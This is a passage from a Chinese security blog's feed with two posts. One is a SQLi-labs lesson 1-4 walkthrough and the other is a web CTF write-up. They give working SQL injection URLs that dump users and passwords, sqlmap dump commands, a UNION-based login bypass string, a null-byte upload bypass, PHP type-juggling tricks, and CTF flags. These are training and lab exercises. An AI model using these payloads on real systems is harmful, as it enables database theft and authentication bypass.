    <content type="html"><![CDATA[<h1 id="Sqli-labs-1-4"><a href="#Sqli-labs-1-4" class="headerlink" title="Sqli-labs  1-4"></a>Sqli-labs  1-4</h1><p>[TOC]</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>结构化查询语言，也叫做SQL，从根本上说是一种处理数据库的编程语言。对于初学者，数据库仅仅是在客户端和服务端进行数据存储。SQL通过结构化查询，关系，面向对象编程等等来管理数据库。编程极客们总是搞出许多这样类型的软件，像MySQL，MS SQL ,Oracle以及Postgresql。现在有一些程序能通过结构化查询来管理大型数据库。脚本小子们一定已经动手体验了类似SQL注入等这样的操作，虽然他们可能已经通过使用自动化工具例如SQL Map或者SQLNinja来实施攻击，但却还不知它真正的原理。在这篇简短的教程里，我将会尽力让你对SQL 注入是怎样工作的，攻击是怎样发生的以及什么是应用程序SQL漏洞有一个深入的理解。我们将要使用的实验室是SQLi Labs，它是一个可以从<a href="https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。所以这篇教程对于程序员和安全测试者都将是一次动手实践的机会。" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。所以这篇教程对于程序员和安全测试者都将是一次动手实践的机会。</a></p><p>##安装<br>从<a href="https://github.com/Audi-1/sqli-labs下载源代码，将源代码复制到Apache" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs下载源代码，将源代码复制到Apache</a> webroot 文件夹（htddocs，/var/www） 打开sql-connections文件夹下的“db-creds.inc”文件修改mysql用户名和密码为你自己的打开浏览器，通过localhost的index.html访问文件夹 点击setup/resetDB 链接在你的mysql中创造数据库<br>   开始游戏！</p><h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170021_645.png" alt=""></p><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1\’ LIMIT 0,1’ at line 1</p><p>对出错信息分析：<br>near ‘’1\’ LIMIT 0,1’ at line 1</p><p>最外层的单引号是标识错误的，将其隔离</p><pre><code>near &#39;         &#39;   1\   &#39; LIMIT 0,1              &#39; at line 1</code></pre><p>1\是我们的参数输入的值，那么1\外的两个单引号是哪里来的呢。很有可能就是原来SQL查询语句中自带的单引号，所以我们对SQL语句进行猜想。<br>对之前猜测的语句进行修改，添加加上后面爆出错误的 ‘1\’中的单引号：</p><pre><code>select uername,password from talble where id = &#39;input&#39;-----&gt;select uername,password from talble where id = &#39;input 攻击代码&#39;</code></pre><p>2.确定字段个数<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘  order by 3–+<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘  order by 4–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170024_632.png" alt=""><br>3.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘  UNION SELECT 1,2,3–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170025_607.png" alt=""></p><blockquote><p>使用union语句查询时，必须使前面的语句查询出错(例如id=-1，而id中并没有为-1的)，以为当查询出错时，sql语句结果为空，也就会显示我们构造的sql语句所查询的内容，即union之后语句的执行结果。</p></blockquote><p>4.爆数据库名字、连接账号信息<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘  UNION SELECT 1,version(),database()–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170027_645.png" alt=""><br>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803170038_567.png" alt=""></p><p>6.暴列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(column_name) from information_schema.<strong>columns</strong> where <strong>table_name</strong>=’users’–+</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803170039_473.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(username,’:’,password) from security.users–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170043_887.png" alt=""></p><h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=1</a>‘<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170056_779.png" alt=""><br>在 id = 1后面添加’: 报语法错误</p><pre><code> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</code></pre><p>错误分析：</p><pre><code>near &#39;&#39; LIMIT 0,1&#39; at line 1</code></pre><p>先分离最外层单引号：</p><pre><code>near &#39;     &#39; LIMIT 0,1     &#39; at line 1</code></pre><p>中间的单引号是手动输入的，说明出错在这里，也就证实了sql语句：</p><pre><code>select username,password from table where id = input</code></pre><p>2.确定字段个数<br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=1</a> order by 4–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170100_90.png" alt=""><br>3.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,3–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170101_674.png" alt=""><br>4.爆数据库名字、连接账号信息<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,version(),database()–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170103_26.png" alt=""><br>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803170105_974.png" alt=""><br>6.爆列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170107_284.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(username,’:’,password) from security.users<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170110_138.png" alt=""></p><h2 id="less-3-GET-基于错误的GET单引号变形字符型注入"><a href="#less-3-GET-基于错误的GET单引号变形字符型注入" class="headerlink" title="less 3 GET -基于错误的GET单引号变形字符型注入"></a>less 3 GET -基于错误的GET单引号变形字符型注入</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-3/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=1\</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803170121_987.png" alt=""></p><pre><code>MySQL server version for the right syntax to use near &#39;&#39;1\&#39;) LIMIT 0,1&#39; at line 1</code></pre><p>错误分析：</p><pre><code>near &#39;&#39;1\&#39;) LIMIT 0,1&#39; at line 1</code></pre><p>现将外层单引号去掉</p><pre><code>near &#39;              &#39;  1\  &#39;) LIMIT 0,1           &#39; at line 1</code></pre><p> 1\ 是手动输入的内容，说明sql语句中还有 (‘’)的内容 ( 注：本来是只有’’)的，但是括号应该也是成对出现的，就变成了(‘’) )</p><p>所以修改sql语句：</p><p>select username，password from table where id = (‘input’)</p><p>所以再用这样的代码来进行注入：</p><pre><code>?id=1′) –-+</code></pre><p>1’) and (‘1’=’1<br>放入sql语句中：</p><p>select username，password from table where id = (‘  1’) and (‘1’=’1  ‘)</p><p>2.确定字段个数</p><p>3.判断回显位(2,3处为显示位)</p><p>4.爆数据库名字、连接账号信息</p><p>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=”security”–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170130_646.png" alt=""><br>6.爆列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”users”–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170130_127.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(username,’:’,password) from security.users–+</p><h2 id="less-4：GET-基于错误-双引号-字符型"><a href="#less-4：GET-基于错误-双引号-字符型" class="headerlink" title="less-4：GET-基于错误-双引号-字符型"></a>less-4：GET-基于错误-双引号-字符型</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-4/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-4/?id=1\</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803170137_745.png" alt=""><br> MySQL server version for the right syntax to use near ‘“1\”) LIMIT 0,1’ at line 1<br>错误分析：</p><pre><code>near &#39;&quot;3\&quot;) LIMIT 0,1&#39; at line 1</code></pre><p>先分离最外层的单引号，那是用来标识错误信息的</p><pre><code>near &#39;           &quot;  3\  &quot;) LIMIT 0,1             &#39; at line 1</code></pre><p>其中 3\ 是手动输入的，还剩下””)</p><p>说明sql语句中应该有 (“”)   （ 括号也配对）</p><p>再次猜测sql语句：</p><pre><code>select * username,password from table where id = (&quot;input&quot;)</code></pre><p>2.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-4/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-4/?id=-1</a>“) UNION SELECT 1,2,3 –+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170145_156.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Sqli-labs-1-4&quot;&gt;&lt;a href=&quot;#Sqli-labs-1-4&quot; class=&quot;headerlink&quot; title=&quot;Sqli-labs  1-4&quot;&gt;&lt;/a&gt;Sqli-labs  1-4&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="SQL" scheme="http://0xmj.club/categories/SQL/"/>
    
    
      <category term="sqlilabs" scheme="http://0xmj.club/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>实验吧web—writeup</title>
    <link href="http://0xmj.club/2018/04/02/%E5%AE%9E%E9%AA%8C%E5%90%A7web%E2%80%94writeup/"/>
    <id>http://0xmj.club/2018/04/02/实验吧web—writeup/</id>
    <published>2018-04-02T08:10:18.000Z</published>
    <updated>2018-04-02T08:11:11.864Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实验吧web—writeup"><a href="#实验吧web—writeup" class="headerlink" title="实验吧web—writeup"></a>实验吧web—writeup</h1><p>[toc]</p><h3 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h3><p><a href="http://ctf5.shiyanbar.com/10/main.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/10/main.php</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181631_235.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181631_176.png" alt=""></p><h3 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h3><p>查看修改或添加HTTP请求头响应头<br>改X-Forwarded-For: 1.1.1.1<br><a href="http://ctf5.shiyanbar.com/phpaudit/" target="_blank" rel="external">http://ctf5.shiyanbar.com/phpaudit/</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181634_594.png" alt=""><br>burp抓包改改X-Forwarded-For: 1.1.1.1<br> <img src="http://oy0tigw51.bkt.clouddn.com/201803181643_54.png" alt=""></p><h3 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h3><p><a href="http://ctf5.shiyanbar.com/basic/inject" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject</a> </p><p>注库名<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ –dbs </p><p>回显</p><p>available databases [2]:<br>[<em>] information_schema<br>[</em>] test<br>注表名</p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ -D “test” –tables –level 5<br>回显</p><p>Database: test<br>[1 table]<br>+——-+<br>| admin |<br>+——-+<br>注字段名</p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ -D “test” -T “admin” –columns –level 5<br>回显</p><p>Database: test<br>Table: admin<br>[2 columns]<br>+———-+————–+<br>| Column   | Type         |<br>+———-+————–+<br>| password | varchar(100) |<br>| username | varchar(100) |<br>+———-+————–+<br>直接注密码内容</p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ -D “test” -T “admin” -C “password” –dump –level 5<br>回显</p><p>Database: test<br>Table: admin<br>[1 entry]<br>+———-+<br>| password |<br>+———-+<br>| idnuenna |<br>+———-+<br>直接登录即可获得flag，</p><p>账号 admin 密码 idnuenna<br>获得key</p><p>恭喜你密码正确！ KEY :!@#WwwN5f0cu5coM</p><h3 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h3><p>Content-Row:响应头内容<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181759_121.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181800_592.png" alt=""></p><h3 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h3><p><a href="http://ctf5.shiyanbar.com/sHeader/" target="_blank" rel="external">http://ctf5.shiyanbar.com/sHeader/</a><br>进入之后给了提示,需要满足三个条件</p><ol><li>安装 .NET 9.9</li><li>使用IE浏览器访问</li><li>要在英国<br>根据提示和题目名称呢，可以判断要修改http头</li></ol><p>于是乎构造</p><p>User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/5.0) .NET CLR 9.9<br>Accept-Language: en-gb;</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803181805_551.png" alt=""></p><h3 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h3><p>Sqlmap -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db –tables<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181824_480.png" alt=""><br>sqlmap.py -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db -T thiskey –columns<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181824_242.png" alt=""></p><p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db -T thiskey -C k0y –dump<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181825_659.png" alt=""><br> 爆字段得到key：whatiMyD91dump</p><p>方法二：<br>输入id=1 and 1=1 显示正常<br>输入id=1 and 1=2 回显错误<br>判断存在SQL注入漏洞（恩）<br>然后判断字段数<br>id=1 order by 1 可以，id=1 order by 2 可以，id=1 order by 3 不行！<br>所以字段数位2<br>id=1 union select 1 错误，id=1 union select 1,2 可以<br>所以字段数位2<br>然后开始爆数据库<br>id=1 union select 1,schema_name from information_schema.schemata</p><p>我们看到爆出了三个库：information_schema、my_db、test</p><p>接下来就是爆my_db的表名(就这个库名比较特别，就它了)<br>id=1 union select 1,table_name from information_schema.tables where table_schema=’my_db’</p><p>在my_db库里面爆出了两个表：news、thiskey<br>对了，thiskey在这里，然后就尝试爆列名</p><p>id=1 union select 1,column_name from information_schema.columns where table_schema=’my_db’</p><p>应该就是k0y了，试试看</p><p>id=1 union select 1,k0y from thiskey</p><h3 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h3><pre><code>&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) {  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);  exit();}$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;){  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;  echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;;}?&gt;&lt;br&gt;&lt;br&gt;Can you authenticate to this website?</code></pre><p>要将hackerDJ进行两次url编码才可满足两个条件</p><p>hackerDJ</p><p>%68%61%63%6B%65%72%44%4A</p><p>%2568%2561%2563%256B%2565%2572%2544%254A<br>提交即可获得flag</p><p><a href="http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A" target="_blank" rel="external">http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A</a><br>回显<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181831_78.png" alt=""></p><p>flag: DUTCTF{PHP_is_the_best_program_language}</p><h3 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h3><p>直接复制到浏览器的console运行即可<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181833_337.png" alt=""></p><h3 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h3><pre><code>//$_POST[user]意思是读取用户在提交表单时输入的user值，$_POST[PASS]同理//如果二者的值都不为空if($_POST[user] &amp;&amp; $_POST[pass]) {    //连接数据库    $conn = mysql_connect(&quot;********&quot;, &quot;*****&quot;, &quot;********&quot;);    //选择数据库，如果出错，打印错误信息并终止代码运行    mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);    if ($conn-&gt;connect_error) {        die(&quot;Connection failed: &quot; . mysql_error($conn));} //将用户输入的user值存储到user变量$user = $_POST[user];//将用户输入的pass值，使用md5 hash后，存入pass变量$pass = md5($_POST[pass]);//从表php中查找pw的值//后半句的意思是：只保留user值为$user那一行的查找结果 $sql = &quot;select pw from php where user=&#39;$user&#39;&quot;;//查询语句的运行结果存入变量query之中$query = mysql_query($sql);//如果找不到，报错并终止if (!$query) {    printf(&quot;Error: %s\n&quot;, mysql_error($conn));    exit();}//提取出query的值并以MYSQL_ASSOC格式存放在row之中$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[&quot;pw&quot;];//如果row[pw]的值存在，且pass的值与row[pw]相同，则返回key//strcasecmp是比较两个值大小，返回：-1,0,1  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) {    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;}//否则返回登录失败else {    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);  }}</code></pre><p>这里pass的值是 用户提交的密码经过MD5hash之后的值 如果二者相同则拿到 key</p><p>找输入输出</p><p>user一项的输出在php代码中如下： $sql = “select pw from php where user=’$user’”; 看起来并未对输入进行过滤，我们试着打入引号，果然报错，证明注入点可用！</p><p>分析</p><p>此时用工具打表的话，意义不大，因为此题目标已经明晰，我们只要让row[pw]的值与pass经过md5之后的值相等即可。 而$pass经过md5之后的值是我们可以通过正常输入控制的。 同时，row[pw]的值是从$sql提取出来的 因此，目标就一句话：只要我们能够修改$sql的值，此题解决。 再次审视注入点：$sql = “select pw from php where user=’$user’”; 在这里我们可以利用sql语句，直接给$sql返回一个值。 也就是说，不需要访问题里的数据库，只要我们修改了$sql的值，此题解决.</p><p>构造</p><p>最终user的框里输入的内容为： ‘AND 0=1 UNION SELECT “c4ca4238a0b923820dcc509a6f75849b” #</p><p>最前面的单引号：闭合原文的where user=’<br>AND 0=1:为了使前面的表达式返回值为空 从而使select pw from php where user=’’ AND 0=1这句话完全没用<br>接着我们使用UNION SELECT “c4ca4238a0b923820dcc509a6f75849b”，直接把MD5值作为返回值retuen给$sql<br>c4ca4238a0b923820dcc509a6f75849b这串MD5值是数字1经过MD5 hash之后的结果<br>最后的#用来注释掉后面没用的东西<br>最终，将’AND 0=1 UNION SELECT “c4ca4238a0b923820dcc509a6f75849b” #输入到user框里，将数字1输入到pass框里，登录成功。<br>或者user=’and 1=0 union select md5(1) #&amp;pass=1<br>key：SimCTF{youhaocongming}<br><img src="http://oy0tigw51.bkt.clouddn.com/201803192336_939.png" alt=""></p><h3 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201803192339_352.png" alt=""></p><p>方法一：</p><pre><code>&lt;?php      $_code = &quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;      $_code = str_rot13($_code);      $_code = strrev($_code);      $_code = base64_decode($_code);      //echo $_code;      $_ans = &quot;&quot;;      for($x = 0; $x &lt; strlen($_code); $x++) {          $t = substr($_code, $x, 1);          $t1 = ord($t) - 1;          $t = chr($t1);          $_ans = $_ans . $t;      }      $_ans = strrev($_ans);      echo $_ans;  ?&gt;</code></pre><p>方法二：</p><pre><code>&lt;?php$str=&#39;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#39;;$_out=&#39;&#39;;$_in= base64_decode (strrev(str_rot13 ($str)));        for($_start=0;$_start&lt;strlen($_in);$_start++){                $_c=substr($_in,$_start,1);                $__=ord($_c)-1;                $_c=chr($__);                $_out=$_out.$_c;        }    echo strrev($_out);?&gt;</code></pre><h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201803200102_440.png" alt=""><br>burp抓包，修改为 uploads/1.php .jpg<br>转到hex编码，将空格20，改为00<br>00截断<br><img src="http://oy0tigw51.bkt.clouddn.com/201803200104_758.png" alt=""></p><h3 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h3><p>PHP代码审计<br>hint：sha1函数你有认真了解过吗？听说也有人用md5碰撞o(╯□╰)o<br>解题链接： <a href="http://ctf5.shiyanbar.com/web/false.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/false.php</a> </p><pre><code>&lt;?phpif (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) {    if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])        echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;;    else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))      die(&#39;Flag: &#39;.$flag);    else        echo &#39;&lt;p&gt;Invalid password.&lt;/p&gt;&#39;;}else{    echo &#39;&lt;p&gt;Login first!&lt;/p&gt;&#39;;?&gt;</code></pre><p>get获得参数name和passowrd，要获得flag，就要让两个参数不相等，但是两个参数的sha1()相等。<br>此处考察了一个知识点，MD5，sha1等hash函数在对数组进行加密的时候会返回FALSE，<br>这里可以运用数组绕过，sha1的参数必须为字符串，如果为其他的类型，则会直接返回FLASE，让两个参数都为数组的形式，就可以FALSE===FALSE，输出flag。当我们传入name[]=1&amp;password[]=2时，会造成<code>sha1(Array) === sha1(Array)</code>，即<code>NULL===NULL</code>，从而吐出flag</p><p>?name[]=1&amp;password[]=2<br>Flag: CTF{t3st_th3_Sha1}</p><h3 id="Guess-Next"><a href="#Guess-Next" class="headerlink" title="Guess Next"></a>Guess Next</h3><p>写个算法没准就算出来了，23333<br>hint：你确定你有认真看判断条件？</p><p>解题链接： <a href="http://ctf5.shiyanbar.com/web/Session.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/Session.php</a>  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803200117_574.png" alt=""><br>burpsuite抓包，将phpsessid置空，并get参数password为空就行。。<br><img src="http://oy0tigw51.bkt.clouddn.com/201803200118_840.png" alt=""><br> CTF{Cl3ar_th3_S3ss1on}</p><h3 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h3><p>啊拉？又是php审计。已经想吐了。<br>hint：ereg()函数有漏洞哩；从小老师就说要用科学的方法来算数。<br>解题链接： <a href="http://ctf5.shiyanbar.com/web/more.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/more.php</a> </p><pre><code>&lt;?phpif (isset ($_GET[&#39;password&#39;])) {    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)    {        echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;;    }    else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)    {        if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE)        {            die(&#39;Flag: &#39; . $flag);        }        else        {            echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;);        }    }    else    {        echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;;    }}?&gt;</code></pre><p>1.ereg漏洞：首先第一层检查需要绕过ereg漏洞，百度可以知道存在截断的问题，ereg读到%00的时候，就截止了</p><p>2.strlen()限制了长度小于8并且大小必须大于9999999,1e8=100000000 &gt; 9999999</p><p>3.strpos()对password进行匹配，必须含有-，最终才输出flag</p><p>于是构造?password=1e9%00<em>-</em></p><p>Flag: CTF{Ch3ck_anD_Ch3ck}</p><blockquote><p><a href="http://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="external">http://blog.csdn.net/qq_31481187/article/details/60968595</a></p></blockquote><h3 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h3><p>找回密码<br>格式：SimCTF{ }<br>解题链接： <a href="http://ctf5.shiyanbar.com/10/upload/" target="_blank" rel="external">http://ctf5.shiyanbar.com/10/upload/</a> </p><p>进入网站step1.php，查看源代码，发现一句<meta name="editor" content="Vim"></p><p>vim编辑，可能存在.xxxx.php.swp的备份文件。尝试了.step1.php.swp、.step2.php.swp，都是404，查看step2.php的源码，发现有一个Submit.php，直接访问，提示you are not an admin，访问.submit.php.swp，果然存在，源码如下</p><pre><code>if(!empty($token)&amp;&amp;!empty($emailAddress)){    if(strlen($token)!=10) die(&#39;fail&#39;);    if($token!=&#39;0&#39;) die(&#39;fail&#39;);    $sql = &quot;SELECT count(*) as num from `user` where token=&#39;$token&#39; AND email=&#39;$emailAddress&#39;&quot;;    $r = mysql_query($sql) or die(&#39;db error&#39;);    $r = mysql_fetch_assoc($r);    $r = $r[&#39;num&#39;];    if($r&gt;0){        echo $flag;    }else{        echo &quot;you are not an admin&quot;;    }}</code></pre><p>邮箱为admin的邮箱，要求token长度为10，且token需要等于零。</p><p>邮箱在step1.php中有提到<meta name="admin" content="admin@simplexue.com"></p><p>token验证可以用php中的0exxxxxxxx绕过。</p><p>payload：?emailAddress=admin@simplexue.com&amp;token=0e11111111</p><p>flag：SimCTF{huachuan_TdsWX}</p><h3 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201803200134_866.png" alt=""><br>让username的MD5和0相等，可以让MD5以0e开头。<br><a href="http://www.cnblogs.com/Primzahl/p/6018158.html" target="_blank" rel="external">PHP处理0e开头md5哈希字符串缺陷/bug</a></p><p>username输入QNKCDZO，得到/user.php?fame=hjkleffifer，访问页面看到一段php源码。</p><pre><code>$unserialize_str = $_POST[&#39;password&#39;]; $data_unserialize = unserialize($unserialize_str); if($data_unserialize[&#39;user&#39;] == &#39;???&#39; &amp;&amp; $data_unserialize[&#39;pass&#39;]==&#39;???&#39;) {    